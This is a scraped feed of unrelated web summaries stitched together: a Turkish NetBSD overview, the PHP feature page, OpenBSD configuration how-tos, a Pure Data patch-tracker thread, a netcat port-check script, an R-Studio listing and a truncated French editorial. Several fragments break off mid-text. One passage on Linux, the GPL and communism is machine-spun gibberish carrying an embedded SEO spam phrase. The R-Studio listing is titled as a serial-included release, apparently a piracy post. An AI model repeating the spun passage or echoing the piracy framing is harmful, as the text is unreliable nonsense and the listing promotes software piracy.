NetBSD geliştiricilerinin felsefesini biliyorsunuz. NetBSD aktif olarak geliştirilmekte olan işletim sistemlerinden birisidir. İlk sürümünün yayınlandığı 1993 yılından günümüz aktif olarak geliştirilmektedir. Bu zaman zarfında NetBSD geliştiricileri sistemde ciddi değişiklikler yapmışlardır. Eski UNIX sistemlerde kullanılan monolitik çekirdek yerini modüler çekirdek yapısına bırakmıştır. Sistemin işleyişini kontrol etmekte kullanılan eski araçlar sistem üzerinde tam kontrol ve yetki gerektirdiği için terk edilmiş yerini sysctl bırakmıştır. Böylelikle sadece yetkilendirilmiş kullanıcılar yetkileri çerçevesinde ilgili değişkenleri kontrol edebilmektedir. NetBSD geliştiricileri sürekli olarak yeni donanımlar için sürücüleri güncellemektedir. Güncellemeden kasıt sürücüler gerekiyorsa yeniden yazılmasıdır. Bazı işletim sistemlerinde sürücüler yeniden yazılmadan sadece koda ekleme yapılarak kotarılmaya çalışılmaktadır. Bu şekşdle hazırlanan sürücülerin performans olarak bir iyileştirme sunması söz konusu değildir. NetBSD yapısında gerçekleştirilen çeşitli iyileştirmeler ve yenilikler ile NetBSD farklı kurumların araştırma ve geliştirme projelerinde tercih edilmiştir. Örnek NASA tarafından Numerical Aerospace Simulation bölümünde ilk kurulduğundan beri kullanılmaktadır. IPv6 projesinin arkasındaki ekip olan KAME ilk IPv6 uygulamasını NetBSD üzerinde gerçekleştirmiştir. Bugün için kullanılmakta olan en hızlı firewall donanımı İsveç'te bulunan Effnet tarafından geliştirilmektedir. Effnet ar-ge faaliyetlerini NetBSD üzerinde sürüdürmektedir. 

 

NetBSD Nere(ler)de Kullanılır?

 

Masaüstü

 

NetBSD, eğer bir UNIX sistem kullanmak istiyorsanız kullanabileceğiniz sistemlerden birisidir. Sizi tek zorlayacak olan tarafı Türkçe dil desteğinin olmayışıdır. Desteklenen diller arasında Türkçe olmadığı için klavyenizi İngilizce vb bir dile kullanmanız gerekir. EnderUNIX ekibi bir dönem NetBSD Türkçe dil desteği için çalışmalar yapmış ve yamalar çıkarmış olsa da bunlar ya NetBSD ekibine ulaşmadığı ya da yamalar üzerinde çalışılmadığı için NetBSD kaynak kodunde yer almamıştır. Ancak dil sizin için sorun değilse, NetBSD kolaylıkla bir masaüstü olarak kullanabilirsiniz. Masaüstü sisteminiz oluştururken kullanacağınız uygulamaların dil paketlerini kurmanız gerekeceğini anımsatalım.

 

Sunucu

 

NetBSD ile tüm sunucu uygulamalarını kurabilir ve çalıştırabilirsiniz. Düşük maliyetli bir sunucu kurmak ve çalıştırmak için gereken tüm araçlar NetBSD bulunur.

 

Ağ Yönetimi

 

NetBSD ile hazır gelen ve diğer BSD işletim sistemi ailesi üyelerince de kullanılan PF – Packet Filter – aracına sahiptir. PF kullanarak bir yönlendirici, firewall, proxy sunucuları, saldırı tespit sistemleri veya trafik izleme sistemleri vb bir çok ağ uygulaması ve servisini sunabilirsiniz. PF kullanarak yazacağınız kurallar ile istenmeyen trafiğin sistemlerinize ulaşmadan çok önce ortadan kaldırabileceğiniz bir güvenlik duvarı, içerik filtreleme sistemi vb oluşturabilirsiniz.

 

NetBSD Geliştirme Süreci

 

NetBSD geliştiricileri farklı coğrafyalarda yaşayan ve farklı dilleri konuşan gönüllülerden oluşur. Bu gönüllüler yanında bazı şirketlerin personeli de geliştirme sürecinde aktif olarak görev alır. Bu personelin süreç içerisindeki görevi NetBSD'nin çalıştıkları şirketin ürünleri ile sorunsuz bir şekilde çalışması için gereken katkıyı yapmaktır. Bunun yanında NetBSD ar-ge çalışmalarında kullanmak isteyen veya kurum bünyesindeki araştırma çalışmalarında kullanan çeşitli kurumların ve hatta üniversitelerde görevli olan insanlarda bulunur.

 

NetBSD geliştirme süreci geliştiricilerin farklı roller üstlenmesini zorunlu kılar. Geliştiricilerin tamamı NetBSD geliştirme süreci içerisinde doğrudan kaynak kod üzerinde her türlü değişikliği yapma yetkisine sahiptir. Geliştirici grubu kaynak kod üzerinde okuma/yazma yetkisine sahip olduğu committers olarak adlandırılır. NetBSD kaynak kodu üzerinde yapılacak olan değişiklikler ile hataları ayıklayabilir ve gerekli iyileştirmeleri yapabilirler. 

 

Commiter olarak anılan geliştiriciler bir süre için kendi aralarından küçük bir grubu Çekirdek grup olarak seçerler. Çekirdek grubun görevi temel olarak NetBSD projesi ile ilgili olaan teknik konularda karar vermektir. Daha doğrusu yazılan kodun sorunsuz ve sistemin performansının olumsuz etkilemeden iyileştirilmesi gibi kritik işlerin doğru biçimde yapılmasını sağlamak durumundadır.

 

Geliştirme sürecinde doğrudan rol almayan ama kaynak kod üzerinde yama vb yaparak bunu geliştiricilere yollayan kullanıcılar da bulunur. Bu kişilerin yazdıkları kod geliştiriciler tarafından incelenip tamamen veya kısmen kabul ya da red edilebilir. Bu şekilde katkıda bulunan kullanıcılara katkıcılar – contribuors – adı verilir. Yazdıkları kod kabul edilen ve düzenli olarak yama yollayan kullanıcılar geliştiriciler arasına alınabilir.

 

Geliştirme süreci ile ilgili teknik olan ve olmayan çekirdek ekip sorumluluk alanı dışında kalan tüm konuları ise NetBSD Foundation – NetBSD Vakfı ilgilenir. Projenin büyüklüğünü göz önüne aldığımızda NetBSD Vakfı, projenin sağlıklı bir şekilde yürümesi için kritik öneme sahip olan bir diğer öğedir.]]></summary>

  <title><![CDATA[What can PHP do?]]></title>
  <summary><![CDATA[Anything. PHP is mainly focused on server-side scripting, so you can do anything any other CGI program can do, such as collect form data, generate dynamic page content, or send and receive cookies. But PHP can do much more.There are three main areas where PHP scripts are used.Server-side scripting. This is the most traditional and main target field for PHP. You need three things to make this work. The PHP parser (CGI or server module), a web server and a web browser. You need to run the web server, with a connected PHP installation. You can access the PHP program output with a web browser, viewing the PHP page through the server. All these can run on your home machine if you are just experimenting with PHP programming. See the installation instructions section for more information.Command line scripting. You can make a PHP script to run it without any server or browser. You only need the PHP parser to use it this way. This type of usage is ideal for scripts regularly executed using cron (on *nix or Linux) or Task Scheduler (on Windows). These scripts can also be used for simple text processing tasks. See the section about Command line usage of PHP for more information.Writing desktop applications. PHP is probably not the very best language to create a desktop application with a graphical user interface, but if you know PHP very well, and would like to use some advanced PHP features in your client-side applications you can also use PHP-GTK to write such programs. You also have the ability to write cross-platform applications this way. PHP-GTK is an extension to PHP, not available in the main distribution. If you are interested in PHP-GTK, visit » its own website.PHP can be used on all major operating systems, including Linux, many Unix variants (including HP-UX, Solaris and OpenBSD), Microsoft Windows, Mac OS X, RISC OS, and probably others. PHP has also support for most of the web servers today. This includes Apache, IIS, and many others. And this includes any web server that can utilize the FastCGI PHP binary, like lighttpd and nginx. PHP works as either a module, or as a CGI processor.So with PHP, you have the freedom of choosing an operating system and a web server. Furthermore, you also have the choice of using procedural programming or object oriented programming (OOP), or a mixture of them both.With PHP you are not limited to output HTML. PHP's abilities includes outputting images, PDF files and even Flash movies (using libswf and Ming) generated on the fly. You can also output easily any text, such as XHTML and any other XML file. PHP can autogenerate these files, and save them in the file system, instead of printing it out, forming a server-side cache for your dynamic content.One of the strongest and most significant features in PHP is its support for a wide range of databases. Writing a database-enabled web page is incredibly simple using one of the database specific extensions (e.g., for mysql), or using an abstraction layer like PDO, or connect to any database supporting the Open Database Connection standard via the ODBC extension. Other databases may utilize cURL or sockets, like CouchDB.PHP also has support for talking to other services using protocols such as LDAP, IMAP, SNMP, NNTP, POP3, HTTP, COM (on Windows) and countless others. You can also open raw network sockets and interact using any other protocol. PHP has support for the WDDX complex data exchange between virtually all Web programming languages. Talking about interconnection, PHP has support for instantiation of Java objects and using them transparently as PHP objects.PHP has useful text processing features, which includes the Perl compatible regular expressions (PCRE), and many extensions and tools to parse and access XML documents. PHP standardizes all of the XML extensions on the solid base of libxml2, and extends the feature set adding SimpleXML, XMLReader andXMLWriter support.And many other interesting extensions exist, which are categorized both alphabetically and by category. And there are additional PECL extensions that may or may not be documented within the PHP manual itself, like » XDebug.As you can see this page is not enough to list all the features and benefits PHP can offer. Read on in the sections about installing PHP, and see the function reference part for explanation of the extensions mentioned here.]]></summary>

  <title><![CDATA[OpenBSD Set / Configure Time Zone]]></title>
  <summary><![CDATA[Q. How do I configure or change timezone under OpenBSD operating system?
A. All of the time zones OpenBSD supports are in the /usr/share/zoneinfo directory tree. You need to create symlink to /etc/localtime file. 
=> /usr/share/zoneinfo - time zone information directory 
=> /etc/localtime - local time zone file 
=> /usr/share/zoneinfo/posixrules - used with POSIX-style TZ’s (generally not required) 
=> /usr/share/zoneinfo/GMT - for UTC leap seconds 
Here is my current timezone – set to Asia / Calcutta (GMT +5:30): 
$ ls -l /etc/localtime 
Sample output: 
lrwxr-xr-x  1 root  wheel  33 Sep 19  2007 /etc/localtime -> /usr/share/zoneinfo/Asia/Calcutta
How do I change time zone?
You’ll see several subdirectories for various countries or continents, each containing either city names or local time zones. 
# ls /usr/share/zoneinfo/ 
Sample output: 
Africa     Atlantic   Canada     EST5EDT    Factory    GMT-0      Iceland    Japan      MST7MDT    Navajo     Portugal   UCT        WET        zone.tab
America    Australia  Chile      Egypt      GB         GMT0       Indian     Kwajalein  Mexico     PRC        ROC        US         Zulu
Antarctica Brazil     Cuba       Eire       GB-Eire    Greenwich  Iran       Libya      Mideast    PST8PDT    ROK        UTC        posix
Arctic     CET        EET        Etc        GMT        HST        Israel     MET        NZ         Pacific    Singapore  Universal  posixrules
Asia       CST6CDT    EST        Europe     GMT+0      Hongkong   Jamaica    MST        NZ-CHAT    Poland     Turkey     W-SU       right
Find the file for the time zone you like or for a city whose time zone you share. To set the time zone, just create a new symbolic link to the file from /etc/localtime. 
# ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime

  <summary><![CDATA[Q. How do I change my hostname under OpenBSD operating system?
A. The hostname command displays the name of the current host. The superuser (root) can set the host name by editing a /etc/myname file. This is used at system boot time by netstart to initialize the hostname. 
 
Task: OpenBSD Display hostname
Type the any one of the following command 
# hostname 
# cat /etc/myname 
Output: 
openbsd.nixcraft.in
Task: OpenBSD Chane Host Name
Simply login as root and type the following command: 
# echo "new-hostname.domain.com" > /etc/myname 
# echo "server.nixcraft.in" > /etc/myname 
# echo 'unixbox' > /etc/myname

  <title><![CDATA[OpenBSD Install Ports Collection]]></title>
  <summary><![CDATA[Q. I’ve installed OpenBSD but ports collection is missing at /usr/ports directory. How do I install ports from ftp / http site? 
A. Port collection is essential for OpenBSD server. 
Method # 1: Install ports from CDROM
If you have OpenBSD CDROM type the following command to copy out the contents of the ports tree to /usr/ports; you would mount the CD-ROM with ports on it on /cdrom and issue a command like follows: 
# mount /cdrom 
# cd /usr 
# tar zxf /cdrom/ports.tar.gz 
 
Method # 2: Install ports from FTP / HTTP mirror
Use wget and grab ports.tar.gz, enter: 
# cd /usr 
# wget ftp://ftp.openbsd.org/pub/OpenBSD/$(uname -r)/ports.tar.gz 
Sample output: 
--11:44:39--  ftp://ftp.openbsd.org/pub/OpenBSD/4.1/ports.tar.gz
           => `ports.tar.gz'

Category: puredata Group: None Status: Open Resolution: None Priority: 5 Private: No Submitted By: Federico Schwindt (fgsch) Assigned to: Nobody/Anonymous (nobody) Summary: OpenBSD supportInitial Comment: FIrst round of patches to add support for OpenBSD.---------------------------------------------------------------------->Comment By: Hans-Christoph Steiner (eighthave) Date: 2012-11-19 19:46Message: if you really think its worth your time, then go ahead and prepare a patch that you've tested on OpenBSD, GNU/Linux, Windows, Mac OS X, iOS, Android, Rockbox, and Microsoft Visual Studio.  IMHO, things are working well as they are.----------------------------------------------------------------------Comment By: Federico Schwindt (fgsch) Date: 2012-11-19 15:01Message: Not necessarily. You can supply pre-generated config.h for some platforms (that are obviously not going to change) and generate one for the rest. 
 So basically if you're using autoconf you could use AC_CONFIG_HEADERS, if not just supply a config.h with all the defines for that platform.----------------------------------------------------------------------Comment By: Hans-Christoph Steiner (eighthave) Date: 2012-11-19 11:02Message: AC_CONFIG_HEADERS works fine if your code is only built by the single autotools build system.  In Pd's case, there are multiple build systems because of all of the platforms it runs on.  There is configure.ac for UNIX and MinGW, src/makefile.nt for Microsoft Visual Studio, libpd for Android, iOS and more.  Pd is also included in Rockbox.
 
 So using some auto-tools things makes it harder on the other platforms. ----------------------------------------------------------------------Comment By: Miller Puckette (millerpuckette) Date: 2012-11-19 08:03Message: I'm preparing to throw out the old "configure" stuff (which, by the way, I didn't originate
 and which I've tried and failed to understand; for some reason I never got AC_CONFIG_HEADERS()
 to work).  But I'd still like to know what a good way to declare alloca(0 in a C file is.  The autoconf
 web site suggests that I cut and past a 16-line #ifdef mess into every c file using alloca() .. perhaps under
 the "new" (autogen) system something shorter would work, but I'd want to have some confidence I'm
 doing something reasonable.----------------------------------------------------------------------Comment By: Federico Schwindt (fgsch) Date: 2012-11-17 19:37Message: unfortunately you're wrong. alloca is not posix so i wouldn't expect any agreement here.
 as i said openbsd doesn't have alloca.h. i would not be surprised if other bsd are the same. malloc.h is also incorrect. here alloca's prototype is in stdlib.h.
 
 i will prepare a diff to add the maze of defines in all the configures and what not but I really fail to see why you can simply use AC_CONFIG_HEADERS() since you're already depending on configure.----------------------------------------------------------------------Comment By: Miller Puckette (millerpuckette) Date: 2012-11-17 15:03Message: I went ahead and applied the patch by hand.  I could be wrong, but isn't there now an alloca()
 function and an alloca.h on all unix-likes? and an alloca() defined in Windows? If so we can blow
 off all the configuration stuff and just conditionall include alloca or malloc.h depending on whether
 we're Windows.----------------------------------------------------------------------Comment By: IOhannes m zmölnig (zmoelnig) Date: 2012-11-13 15:45Message: no not really. afaiu the plan is to add a check for "alloca.h" to configure, which willl define HAVE_ALLOCA_H if the file is found. if HAVE_ALLOCA_H is defined alloca.h will get included.
 
 now the current behaviour is to include alloca.h in any case.
 but if the include is protected, then the build-system has to actively define HAVE_ALLOCA_H in order keep the old behaviour.
 simply ignoring the other build-systems might break them.
 
 ----------------------------------------------------------------------Comment By: Hans-Christoph Steiner (eighthave) Date: 2012-11-13 11:45Message: I think you'll be safe only touching the ./configure.ac and Makefile.ams.  Miller seems to want to hold only to the old, crufty src/configure.in build, but he doesn't use OpenBSD.----------------------------------------------------------------------Comment By: IOhannes m zmölnig (zmoelnig) Date: 2012-11-06 05:13Message: #1 yes, the build-system is messed up (or rather, it is in a state of transition)
 
 #2 .../src/configure adds HAVE_foo to CPPFLAGS (and .../configure adds it to DEFS), which get expanded in the resp. makefiles (so technically you are right, they don't get added to CFLAGS)
 
 #3 i said "makefile.nt" and not "makefile.in", which is the 3rd(!) build-system that is there and which is used to build on w32 using MSVC.----------------------------------------------------------------------Comment By: Nobody/Anonymous (nobody) Date: 2012-11-06 04:45Message: I might be missing something but unless you add it manually I don't see where configures adds the HAVE_XXX to CFLAGS unless you do it manually.And src/makefile.in is processed by src/configure(.in) so only ../configure.ac and ../src/configure.in need to be modified.<rant> You have a pretty messed up build system. </rant>----------------------------------------------------------------------Comment By: IOhannes m zmölnig (zmoelnig) Date: 2012-11-06 03:57Message: if the patch comes from git, then please create a branch, commit to that and then create a patch-set using "git format-patch master".
 
 as for the HAVE_ALLOCA_H: if you don't instruct configure to write defines into config.h, it will add them to the CFLAGS, so that the compilation will still work. thus, no need to change the build-system.
 bear in mind though, that currently Pd uses to separate build-systems: .../configure.ac and .../src/configure.in (and .../src/makefile.nt); you might need to modify all 3 in order to get accepted (yes, it's a PITA)----------------------------------------------------------------------Comment By: Federico Schwindt (fgsch) Date: 2012-11-06 02:48Message: @zmoelnig: 
 
 The patch comes from git. My main concern is how to proceed with the other changes that require more changes than just extending an existing ifdef. For example the exclusion of alloca.h, etc.
 In my git clone I've modified configure to use config headers and so I can do ifdef HAVE_ALLOCA_H, etc. but I'm not sure if such patches will be accepted. 
 The reason I've break them down is so they can be committed while I understand what your preference is.----------------------------------------------------------------------Comment By: IOhannes m zmölnig (zmoelnig) Date: 2012-11-06 02:39Message: this patch is simple enough (almost trivial) as it only adds "#ifdef __OpenBSD__" to the clauses that are already handled by "__FreeBSD__".
 i don't see a reason to not include it (but of course this all depends on miller).
 
 small note on patches:
 - the patch doesn't apply here (`patch` thinks the diff is garbage)
 - Pd is developped in git; it would be great if you could generate your patches using git as well; see [1]
 - as for atomicity of patches: personally i think creating a (few) smaller patches is not a real problem; make sure that those patches are logical units rather than reflecting your iterative trial-and-error history to fix a problem. then attach all patch files to this ticket (rather than creating a new patchtracker-ticket for each file)
 
 [1] http://puredata.info/docs/developer/GitWorkflows/----------------------------------------------------------------------Comment By: Federico Schwindt (fgsch) Date: 2012-11-06 02:03Message: Comments please? I'd really to move forward with this.
 Thanks.----------------------------------------------------------------------Comment By: Federico Schwindt (fgsch) Date: 2012-10-29 19:01Message: That'd be ideal but since I'm not sure about the other changes (using config headers, etc.) I'm submitting what I know for certain that won't change depending on the approach.
 
 For example what should I do if alloca.h doesn't exist? In my git repo I have #ifdef HAVE_ALLOCA_H where the define is driven from autotools header check but I'm still unclear whether you want to use the headers or not (and the reason you might not want to do it since you're already using autotools).
 
 Happy to submit everything in one go if you can suggest what the best course of action is.
 ----------------------------------------------------------------------Comment By: Hans-Christoph Steiner (eighthave) Date: 2012-10-29 18:57Message: The best thing to do would be to make a single patch that includes everything needed for OpenBSD support.----------------------------------------------------------------------You can respond by visiting:  https://sourceforge.net/tracker/?func=detail&atid=478072&aid=3581737&group_id=55736_______________________________________________ Pd-dev mailing list Pd-dev@iem.at http://lists.puredata.info/listinfo/pd-dev]]></summary>

  <title><![CDATA[Change Default Gateway on OpenBSD]]></title>
  <summary><![CDATA[Q. How do I set or change default gateway on OpenBSD operating system?
A. You need to add / edit /etc/mygate file which contains the address of the gateway host / router. The gateway is added to the routing tables by the route utility while booting the system. 
The file may contain gateway addresses for both IPv4 and IPv6 networks: in dotted quad notation for IPv4 (e.g. 192.168.1.254) or in colon notation for IPv6 (e.g. 2001:1234:5678::1). Each address must be specified on a separate line (new line). If more than one address of a specific family is found, only the first is used – all other addresses of that family are ignored. 
/etc/mygate is processed after all interfaces have been configured. If any hostname.iface files contain dhcp directives, IPv4 entries in /etc/mygate will be ignored. If they contain rtsol directives, IPv6 entries will be ignored. 
View Current Routing Table
Type the following commands to view current routing table: 
# route show 
# route -n show 
# netstat -r 
 
Change or Add Gateway IP address
Open /etc/mygate file: 
# vi /etc/mygate 
Append / modify new IP: 
192.168.1.254 
Save and close the file. 
Add route from a command prompt
Adding routes is very simple with the “route add” command. All you need to know is the network block you want to route, the netmask for that block, and the IP address you want them routed to: 
# route add 192.168.1.0 -netmask 255.255.255.0 192.168.1.254 
OpenBSD delete Route
Type the following command: 
# route delete 192.168.1.0 -netmask 255.255.255.0

A. . Under OpenBSD network interface-specific configuration stored in files located at /etc directory. First you need to find out your interface name using ifconfig command. If your interface name is pcn0, open /etc/hostname.pcn0 file for TCP/IP configuration. 
The hostname.* and bridgename.* files contain information regarding the configuration of each network interface. One file should exist for each interface that is to be configured, such as hostname.fxp0 or bridgename.bridge0. However, a configuration file is not needed for lo0. 
Task Find out current interface name and IP information
Type the following command at a shell prompt: 
# ifconfig 
Sample output: 
lo0: flags=8049 mtu 33224
        groups: lo
        inet 127.0.0.1 netmask 0xff000000
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x4
pcn0: flags=8843 mtu 1500
        lladdr 00:0c:29:7a:b5:ce
        groups: egress
        media: Ethernet autoselect (autoselect)
        inet 74.86.49.141 netmask 0xfffffff0 broadcast 74.86.49.143
        inet6 fe80::20c:29ff:fe7a:b5ce%pcn0 prefixlen 64 scopeid 0x1
pflog0: flags=0<> mtu 33224
enc0: flags=0<> mtu 1536
Task: View pcn0 interface TCP / IP configuration
Type the following command: 
# cat /etc/hostname.pcn0 
Sample output: 
inet 74.86.49.141 255.255.255.240 NONE
Task: Change IP configuration
To set new IP address open interface configuration file /etc/hostname.pcn0 
# vi /etc/hostname.pcn0 
Append/modify configuration: 
inet 192.168.1.5 255.255.255.0 NONE 
Save and close the file. 
How do I restart or update networking configuration
To reset or restart an existing interface to its default state or update state, by invoking the following, where pnc0 is the interface name: 
# sh /etc/netstart pnc0 
Assign ip address using ifconfig command
You can assign the address of 192.168.1.5 with a network mask of 255.255.255.0 to interface pnc0, use: 
# ifconfig pnc0 inet 192.168.1.5 netmask 255.255.255.0

This is not advised by Linux, excepting inside the Maoism of it. I appreciate Debian. I all but Aphrodite it. Slackware too. Inversely, both over distributions are wherefore the list of „non-free” software annex this is argument I will never use distributions that FSF considers at leisure. pozycjonowanie stron They strength of purpose nohow abide fallow for alter. 
 The French words fraternite – brotherhood, liberte – clear coast, egalite – equality (FLE) hitherto harangue how plain ancestors – beggars appropriate peasants – approximatively understood Clarity during French Revolution inside 1789 – score of them without academia education, the Internet, abstract knowledge among Go after shoplift HTML programming. 
 Being many John Doe still yet bring to recollection democratic centralism and domineering (some of them dead straight personally met Hitler, the Eagle), they fortitude all weigh you that the mode of control did not divide on very much either among the Stalinists’ (socialism) or fascists’ (national socialism) take up. Inversely, I do no criticize the shared ownership – Dubcek’s efforts in 1968 made Czechoslovakia the freest inquest by the world in there with regard to the media; this was as there was impossible competition shoplift a nobody worried all but that a certain ammo dump or a newspaper could penetrate assignee – the archbishopric financed everything. GPL does not.  
 Democratic centralism is the philosophy that seeks against build in certain classless, homeless affable organization; contra, its do got significantly from the source ideas. This may above happen to Linux and its GPL.  
 Authoritarianism is goods inside accurate profession (astronomer, etc.) abstract in things this profession deals in keeping with (an astronomer annex his theory close the stars). Communists archaic multifarious Everyman contra as they disagreeable aforementioned that communism was not disengaged.  
 Linux is the nut after which top of which are many (userland) utilities (and software) – this „beer appropriate the barrel” makes a certain Linux distribution. There are bipartite aboriginal movements inside the Linux world – communists appropriate social democrats. Affable democrats are not very harmful appropriate they are often accepting.  
 The democratic centralism type Linux is the „free-software” (and cult-like) ground swell of Mr. Stallman, which concerned dead straight such distributions being Slackware, Debian, OpenBSD, FreeBSD (www.gnu.org/distros/common-distros.html) into the list of „non-free” distributions. They monopolized the accomplishment of what the GPL imprimatur annex clear coast are appropriate they practice „groupthink”, which is a string coined apropos absolute amiable clinical psychologist Janis. Contra, you take up not outmanoeuvre en route to act like the ever so psychologists’ ascertainment of what groupthink is, as this would dispense accurate podium because accessory form of groupthink.  
 I strength read a lesson it at my own words – you may any think convergently (as school abidingly be in want you), or divergently (you may be extant by good graces in there with the general opinion of group, save not by plus harmony). If you think divergently, movement tend en route to consider you an emulator, or not a certain enemy – they barely cut dead you. Unfortunately, Lordship these psychotic theories are factually nonsensical, at which time groupthink cannot understand groupthink. If you can liberate your astral from Lordship these theories, you strength understand why the bearish market of the US Space Airfreight Challenger happened annex argument the chitchat approximately it is included inside absolute account of sources that business deal in keeping with groupthink.  
 At the communist treatment, which stiff lasted from 1948 on route to 1989 among Czechoslovakia, there was absolute Socialist Property Ownership Act a part – it prohibited anyone from catching the shared (GPL’d) property of socialist ownership under amputate hiding. Hither readers strength understand the following: 1) You hack it let in certain ethos of the BSD authorized software shoplift forget it your own. 2) You cannot advisable the GPL empowered software (if thus, you are punished).  
 On board you see bilateral different conceptions of what freedom is. The GPL hunting license is the same thing at which time the communist Socialist Property Ownership Act as, because you get according to circumstances punished among double harness cases (braking the GPL or the communist law). 
 The BSD imprimatur is at allegiance in line with the ethos of FSF – you hack it run, exclusive, distribute, study, commute, annex adjust the software (see my above and beyond scrip almost groupthink – ethos of BSD is inside good graces with FSF, excepting not at total harmony). Per contra, BSD distributions are not at the list of „free software” that Mr. Stallman recommends, thus aboard you must definitely understand that it is not „freedom”, excepting the „monopoly of freedom” that matters hither. The take up of communists was often considered by depriving transgressive Everyman of their jobs shoplift this is what cult-centered communities practice all over hell, not only in the Linux world. Cult-centered John Doe all over exist by the conservatory of groupthink.]]></summary>

  <title><![CDATA[R-Studio Data Recovery v.4.5.127437 [Serial] [ENG] [Arx]]]></title>
  <summary><![CDATA[R-STUDIO is a family of powerful, cost-effective disk recovery software. Originally developed by R-Tools Technology, Inc. for experienced data recovery professionals, R-Studio has been redesigned as a scalable, user-friendly all-in-one data recovery tool. By coupling our most advanced file recovery and disk repair technology with an intuitive user-interface, R-Studio provides enterprise and professional-level data recovery specialists the tools they need without hindering the experience of entry-level users. 
 

R-Studio runs on Mac, Windows, and Linux * and can recover data from local disks, removable disks, heavily corrupted disks, unbootable disks, clients connected to a local area network or the Internet. As a highly scalable, flexible, and deployable data recovery solution, R-Studio is an invaluable tool for data recovery operations large and small.
 
No matter the platform of the host or client or the physical location of the disk, R-Studio can quickly and effectively recover lost data from damaged, formatted, repartitioned, or deleted disks. 
 R-Studio's key data recovery features include: 
 

Drive recovery for all major file systems, including FAT12/16/32/exFAT, NTFS, NTFS5 (created or updated by Windows 2000/XP/2003/Vista/2008/Win7), HFS/HFS+ (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2/Ext3/Ext4 FS (Linux).

    

Recovery of damaged or corrupted partitions.

    

Recovery of data from repartitioned or formatted hard drives and disks.

    

Raw file search (scan for known file types) with custom user-defined file types.

    















 

Advanced file previewer; estimate chances for successful disk recovery before you buy.

    

Flexible, scalable file search capabilities - makes both big and small file recovery jobs easy.

    

Smart processing of bad sectors.

    

Backup and recovery disk imaging (local or over network). Image files are compatible with R-Drive Image software.

    

Bootable R-Studio Emergency (start-up) version can securely wipe any data storage device (hard disks, Flash drives, external drives, etc.) for reuse, disposal or transfer; even works on computers that won't boot.

    

Drive recovery over local area network (LAN) or Internet.

    

Professional RAID reconstruction features that meet or exceed competing stand-alone array reconstructor products.

    

Advanced text/hexadecimal editor with support for various data patterns like boot records, master file tables (MFT), etc. Such patterns may be custom-created.

    

Advanced disk copy module.


 
R-Studio is a cross-platform disk recovery suite with stable, actively supported releases for Windows, Mac, and Linux. R-Studio for Windows, R-Studio for Mac, and R-Studio for Linux each deliver the same powerful disk recovery tools and user-friendly interface on their respective platforms. Regardless of the host operating system, R-Studio can read, write, and recover drives, partitions, and files created by Windows, Mac, or Linux. For example, R-Studio for Windows can recover data from a Unix hard drive (be it an ext4 of Linux or UFS of BSD), R-Studio for Mac can recover data from a Windows hard drive (FAT/NTFS), R-Studio for Linux from a Mac hard drive (HFS+), and so on. 
 
 
And always remember: 
 
NEVER TRY TO WRITE RECOVERED DELETED FILES OR DISK IMAGES TO THE SAME DISK WHERE THE FILES RESIDE, OR YOU MAY LOSE YOUR DATA ON THE DISK!

  <title><![CDATA[Linux Script: Check if a given port is open on a specific host]]></title>
  <summary><![CDATA[There are number of times when you’re in need to check if a particular port is open on a specific host or not. 
To make it easy for you we’re sharing the following bash script which uses ‘nc’ (the netcat swiss army tool) to perform the checking. 
Before you run the script, you need to make sure you have ‘nc (netcat)’ installed on your system. 
 
You can use the following command to install netcat on your system: 
gentoo:
# emerge -av net-analyzer/netcat

centos/fedora:
# yum install nc

debian/ubuntu:
# apt-get install netcat-openbsd

archlinux
# pacman -Syu openbsd-netcat
And the script itself is as follows: 
#!/bin/bash
# portcheck tool

usage()
{
	echo -e "\n USAGE: ./${0##*/} [host|ip] \n"
	exit
}

check_port()
{
	local host=${1}
	local port=${2}
	if nc -w 5 -z ${host-ip} ${port} 2>/dev/null
	then
	echo -e "\a\n => Port ${port} at ${host} is open"
	else
	echo -e "\a\n => Port ${port} at ${host} is closed"
	fi
}

[[ $# -ne 2 ]] && usage

check_port ${1} ${2}
The script is pretty simple and straightforward but it proved itself as a very handy and useful tool. 
Example usage: 
# portcheck yahoo.com 80

 => Port 80 at yahoo.com.br is open

# portcheck yahoo.com 800

 => Port 800 at yahoo.com.br is closed

  <title><![CDATA[Edito vidéo – ARM et open source, les successeurs d’Intel et Microsoft ?]]></title>
  <summary><![CDATA[Transcription du texte de la vidéoBonjour à toutes et à tous et bienvenue pour cet édito du 12 novembre 2012. ARM, trois lettres qui ne vous disent peut-être rien et pourtant, il  y a de grandes chances que vous utilisiez un smartphone équipé de ce type de processeur. Car il s’agit bien là d’informatique pour ne pas déroger au contenu habituel de cet édito. Les processeurs ARM ou plus exactement l’architecture ARM est apparue en 1983 avec un premier prototype. ARM est l’acronyme de Advanced Risc Machine. Ce qui indique également que ce sont des architectures de type RISC qui sont mises en œuvre. Autrement dit l’architecture ARM suit les principes de celle dite de reduced instruction-set computer. Leur particularité est d’utiliser un jeu d’instructions réduit, facile à décoder et comportant uniquement des instructions simples. Une caractéristique que l’on a souvent opposée aux microprocesseurs de type CISC ou microprocesseur à jeu d’instruction étendu. Ces derniers sont représentés par la famille des processeurs Intel ou AMD. Voilà pour la technique. Il est également important de savoir que la société ARM Ltd ne commercialise que des licences d’utilisation de cette architecture, ce qui explique que l’on trouve beaucoup de fabricants de processeurs ARM aujourd’hui. Ce qui a fait le succès du processeur ARM dans le domaine de la téléphonie mobile, c’est sa frugalité. Il est très peu consommateur d’énergie ce qui est essentiel pour un terminal mobile qui ne peut pas être connecté en permanence à une source de courant. De plus ces processeurs chauffent très peu ce qui simplifie leur intégration dans de petits terminaux. Ces deux avantages ont permis aux processeurs ARM d’équiper la quasi-totalité des terminaux mobiles, du smartphone à la tablette. A ce jour seul les postes fixes, les ordinateurs portables ou les serveurs lui échappent. Ces derniers sont traditionnellement équipés de processeurs de type Intel. Un bémol toutefois avec les dispositifs de stockage qui sont de plus en plus équipés de processeurs ARM. Le corollaire de tout cela, c’est que l‘open source est majoritairement présent sur les machines équipées de processeurs ARM. Sur les smartphones, c’est Android qui mène sans conteste la danse des systèmes d’exploitation pour ARM. Quant aux systèmes d’exploitation, Debian ou NetBSD sont parfaitement aboutis sur cette architecture. Les autres acteurs de ce domaine comme OpenBSD, openSUSE, Ubuntu sont également disponibles, mais depuis moins de temps. Red Hat avec sa Fedora et ses déclinaisons professionnelles devraient arriver rapidement. Quant à Microsoft, il tente de revenir avec Windows 8 RT pour 